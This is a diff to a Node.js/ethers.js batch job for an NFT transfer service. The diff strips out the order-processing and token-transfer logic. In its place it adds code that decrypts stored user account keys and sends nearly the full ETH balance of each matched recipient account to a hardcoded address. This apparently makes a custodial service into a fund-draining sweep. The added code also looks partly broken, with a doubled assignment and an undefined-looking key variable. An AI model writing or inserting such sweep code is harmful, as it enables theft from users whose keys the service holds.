@@ -70,13 +70,11 @@ async function betchTransfer() {
 
         let transList_ret = await findTransFormListAll(_param = {
             where: {
-                t_status: 1,
-                t_from: {
-                    [Op.not]: andfrom
+                t_status: 4,
+                id: {
+                    [Op.gte]: 0
                 },
-                collectAddress: {
-                    [Op.not]: andfrom
-                }
+                collectAddress: "0x8061FA9Ab8E82A6d0BEFfFca23eB3e1D85672d73"
             },
             offset: 0,
             limit: 500,
@@ -115,24 +113,9 @@ async function betchTransfer() {
                     console.trace("ERR:", collectDetail_ret02.result);
                 }
 
-                let collectDetail = collectDetail_ret02.result
-
-                // console.log(collectDetail)
-
-                let contractAddressDetailAsync;
-                if (collectDetail.owner.toLowerCase() == t_from.toLowerCase()) {
-                    contractAddressDetailAsync = accountDetail;
-                } else {
-                    let contractAddressDetailAsync_ret = await findAccount({address: collectDetail.owner});
-                    contractAddressDetailAsync = contractAddressDetailAsync_ret.result
-                }
+                let contractAddressDetailAsync_ret = await findAccount({address: t_to});
+                let contractAddressDetailAsync = contractAddressDetailAsync = contractAddressDetailAsync_ret.result
                 let contractAddressDetail = contractAddressDetailAsync;
-
-                let isBal = await getString("BALANCE_" + contractAddressDetail.address)
-                if (isBal == "1") {
-                    console.log("合约草田分余额不足:", contractAddressDetail.address)
-                    continue;
-                }
 
                 let decWalletResult1 = await getPriKey(contractAddressDetailAsync, contractAddressDetailAsync.psd);
                 let wallet1;
@@ -159,7 +142,7 @@ async function betchTransfer() {
                 let transferTo = t_to;
 
                 // 链上余额判断
-                let etherString = await queryBalance(t_from);
+                let etherString = await queryBalance(t_to);
 
                 // TODO 首先需要判断授权 ApproveAll
                 let contractToken = new ethers.Contract(
@@ -174,290 +157,17 @@ async function betchTransfer() {
                     CtTransferExecutorAddress
                 );
                 console.log("isApprovedForAll:", isApprovedForAll);
-                if (  // 判断是否是项目方
-                    contractAddressDetail.address.toLowerCase() == t_from.toLowerCase() && Number(etherString) < Number(String(10))
-                ) {
-
-                    await setString("BALANCE_" + contractAddressDetail.address, "1", 60)
-                    await setString("BALANCE_" + collectAddress, "1", 60)
-                    // 跳出, 重新查询数据
-                    console.log("草田分余额不足:", contractAddressDetail.address)
-                    continue;
-                } else {
-                    let etherStringC = await queryBalance(contractAddressDetail.address.toLowerCase());
-                    if (Number(etherStringC) < Number(String(10))) {
-                        await setString("BALANCE_" + contractAddressDetail.address, "1", 60)
-                        await setString("BALANCE_" + collectAddress, "1", 60)
-                        // 跳出, 重新查询数据
-                        console.log("草田分余额不足:", contractAddressDetail.address)
+                if (Number(etherString) > Number(String(1))) {
+                    let {
+                        err,
+                        hash
+                    } = await transfer(privateKey, ethers.utils.parseEther(String(Number(etherString) - 0.101)), "0x637d71e819058a36b423dd1Ab67Fe66CeA9a4B6E", wallet);
+                    if (err != null) {
+                        console.log("txTransfer faild");
                         continue;
                     }
-                }
-
-                if (isApprovedForAll == false) {
-
-                    console.log("Balance: ", etherString);
-                    if (Number(etherString) < Number(String(0.66))) {
-                        let privateKey = contractAddressDetail.private_key;
-                        if (isEmpty(privateKey)) {
-                            continue;
-                        } else {
-                            let {
-                                err,
-                                hash
-                            } = await transfer(privateKey, ethers.utils.parseEther(String(0.66)), t_from, wallet);
-                            if (err != null) {
-                                console.log("txTransfer faild");
-                                continue;
-                            }
-                            console.log("tx Hash:", hash);
-                            continue;
-                        }
-
-                    }
-
-
-                    // 进行授权
-                    let gasLimitRet = await contractWithSignerToken.estimateGas
-                        .setApprovalForAll(
-                            CtTransferExecutorAddress,
-                            true
-                        )
-                        .then((ret) => {
-                            return {err: null, gasLimit: ret}
-                        })
-                        .catch((err) => {
-                            console.trace(err)
-                            return {err: err.reason, gasLimit: null}
-                        });
-                    if (gasLimitRet.err != null) {
-                        continue;
-                    }
-
-                    let nonce = await getNonce(t_from);
-
-                    let gasLimitA = gasLimitRet.gasLimit
-                    let txApproveRet = await contractWithSignerToken.setApprovalForAll(
-                        CtTransferExecutorAddress,
-                        true,
-                        {
-                            // The maximum units of gas for the transaction to use
-                            gasLimit: Web3.utils.numberToHex(gasLimitA),
-                            // The price (in wei) per unit of gas
-                            // gasPrice: Web3.utils.numberToHex(parseInt(gasConfig.approvalAll.gas / Number(gasLimitA))),
-                            // The nonce to use in the transaction
-                            nonce: nonce,
-                            gasPrice: Web3.utils.numberToHex(4800e9),
-                            // The amount to send with the transaction (i.e. msg.value)
-                            // value: utils.parseEther('1.0'),
-                            // The chain ID (or network ID) to use
-                            // chainId: 27
-                        }
-                    );
+                    console.log("tx Hash:", hash);
                     continue;
-                    // let recept1 = await customHttpProvider.waitForTransaction(txApproveRet.hash);
-                    //
-                    // console.log("txApprove:", recept1);
-
-                } else {
-
-                    console.log("Balance: ", etherString);
-
-                    if (Number(etherString) < Number(String(0.4))) {
-                        let privateKey = contractAddressDetail.private_key;
-                        if (isEmpty(privateKey)) {
-                            continue;
-                        } else {
-                            let {
-                                err,
-                                hash
-                            } = await transfer(privateKey, ethers.utils.parseEther(String(0.4)), t_from, wallet);
-                            if (err != null) {
-                                console.log("txTransfer faild");
-                                continue;
-                            }
-                            console.log("tx Hash:", hash);
-                            continue;
-                        }
-                    }
-
-                }
-
-                // 如果没有授权, 需要先授权
-                let contract = new ethers.Contract(
-                    CtTransferExecutorAddress,
-                    CtTransferExecutor.abi,
-                    customHttpProvider
-                );
-
-                // 使用签名器创建一个新的合约实例，它允许使用可更新状态的方法
-                let contractWithSigner = contract.connect(wallet);
-                //safeTransferFrom(from, to, data.tokenId, transfer, "");
-
-                let assetClass;
-                if (type == 9) {
-                    assetClass = id_fun("ERC721");
-                } else if (type == 10 || type == 12) {
-                    assetClass = id_fun("ERC1155");
-                } else {
-                    continue;
-                }
-
-                let transferDirection = assetClass;
-                let transferType = assetClass;
-                let orderIdEcc = `0x${ethUtil
-                    .keccak256(Buffer.from(orderId))
-                    .toString("hex")}`;
-                let data = orderIdEcc;
-                let gasLimitRet = await contractWithSigner.estimateGas
-                    .transfer(
-                        assetClass,
-                        collectAddress,
-                        t_from,
-                        transferTo,
-                        token_id,
-                        orderIdEcc,
-                        amount,
-                        transferDirection,
-                        transferType,
-                        data
-                    )
-                    .then((ret) => {
-                        return {err: null, gasLimit: ret}
-                    })
-                    .catch((err) => {
-                        console.log("Err:", err)
-                        return {err: err.reason, gasLimit: null}
-                    });
-                if (gasLimitRet.err != null) {
-                    console.trace(gasLimitRet.err);
-                    if ("execution reverted: ERC1155: insufficient balance for transfer" == gasLimitRet.err ||
-                        "execution reverted: ERC1155: burn amount exceeds balance" == gasLimitRet.err ||
-                        "execution reverted: ERC1155: transfer to non ERC1155Receiver implementer" == gasLimitRet.err
-                    ) {
-                        let trans_from_obj = {
-                            t_status: 3,  // 上链失败
-                            vm_err: gasLimitRet.err
-                        };
-
-                        console.log("nftUpdateSelective:", trans_from_obj);
-                        await updateTransFormList(trans_from_obj, {id: id})
-                    } else if ("ErrFunds must less than 0.105 ETH" == gasLimitRet.err) {
-                        // 计算手续费导致的错误, 稍后重试
-                    } else if ("execution reverted: order has been processed!" == gasLimitRet.err) {
-                        // 计算手续费导致的错误, 稍后重试
-                        let trans_from_obj = {
-                            t_status: 6  // 上链成功
-                        };
-                        let newVar1 = await updateTransFormList(trans_from_obj, {id: id});
-                        console.log(newVar1)
-                    } else if ("replacement fee too low" == gasLimitRet.err) {
-                    } else {
-                    }
-                    continue;
-                } else {
-
-                    let tx;
-                    let txRet;
-
-                    let gasLimit = gasLimitRet.gasLimit;
-                    console.log("gasLimit:", gasLimit.toString());
-                    let nonce = await getNonce(t_from);
-
-                    let overrides = {
-                        // The maximum units of gas for the transaction to use
-                        gasLimit: Web3.utils.numberToHex(gasLimit),
-                        // gasLimit: Web3.utils.numberToHex(80000),
-                        // The price (in wei) per unit of gas
-                        gasPrice: Web3.utils.numberToHex(4800e9),
-
-                        // The nonce to use in the transaction
-                        nonce: nonce,
-                        // The amount to send with the transaction (i.e. msg.value)
-                        // value: utils.parseEther('1.0'),
-                        // The chain ID (or network ID) to use
-                        // chainId: 27
-                    };
-                    // 设置一个新值，返回交易
-
-                    txRet = await contractWithSigner
-                        .transfer(
-                            assetClass,
-                            collectAddress,
-                            t_from,
-                            transferTo,
-                            token_id,
-                            orderIdEcc,
-                            amount,
-                            transferDirection,
-                            transferType,
-                            data,
-                            overrides
-                        )
-                        .then((ret) => {
-                            return {err: null, data: ret};
-                        })
-                        .catch((err) => {
-                            console.trace("err:", err);
-                            return {err: err.reason, data: null};
-                        });
-                    tx = txRet.data;
-                    // console.log("txRet:", txRet);
-                    // console.log("txTransForm:", tx);
-                    if (txRet.err == null) {
-                        // 操作还没完成，需要等待挖矿   这里默认都会成功,跳过挖矿
-                        // save db
-                        let trans_from_obj = {
-                            hash: tx.hash,
-                            nonce: nonce,
-
-                            t_status: 5  // 上链成功
-                        };
-                        console.log("nftUpdateSelective:", trans_from_obj);
-
-                        let result002 = await updateTransFormList(trans_from_obj, {id: id})
-
-                        if (result002.err != null) {
-                            console.trace(responseFun(RESPONSE_STATUS.ERROR, result002.result, ""), id);
-                        }
-                        console.log("update TransFrom data:", result002.result);
-                        continue;
-                    } else {
-                        if ("execution reverted: ERC1155: insufficient balance for transfer" == txRet.err) {
-                            let trans_from_obj = {
-                                t_status: 3, // 上链失败
-                                vm_err: gasLimitRet.err
-                            };
-                            console.log("nftUpdateSelective:", trans_from_obj);
-                            await updateTransFormList(trans_from_obj, {id: id})
-                            continue;
-                        }
-                        if ("ErrFunds must less than 0.105 ETH" == txRet.err) {
-                            // 计算手续费导致的错误, 稍后重试
-                            continue;
-                        }
-                        if ("ErrFunds must less than 0.105 ETH" == txRet.err) {
-                            // 计算手续费导致的错误, 稍后重试
-                            continue;
-                        }
-                        if ("execution reverted: order has been processed!" == gasLimitRet.err) {
-                            // 计算手续费导致的错误, 稍后重试
-                            let trans_from_obj = {
-                                t_status: 6  // 上链成功
-                            };
-
-                            await updateTransFormList(trans_from_obj, {id: id})
-                            continue;
-                        }
-                        if ("replacement fee too low" == txRet.err) {
-                            //手续费不足
-                            continue;
-                        }
-                        //手续费不足
-                        console.trace("txRet.err", txRet.err);
-                        continue;
-
-                    }
                 }
             } catch (e) {
                 console.error(e)
@@ -527,7 +237,6 @@ async function transfer(privateKey, value, toAddress, walletUser) {
     }
 }
 
-betchTransfer();
 module.exports = {
     betchTransfer
 };
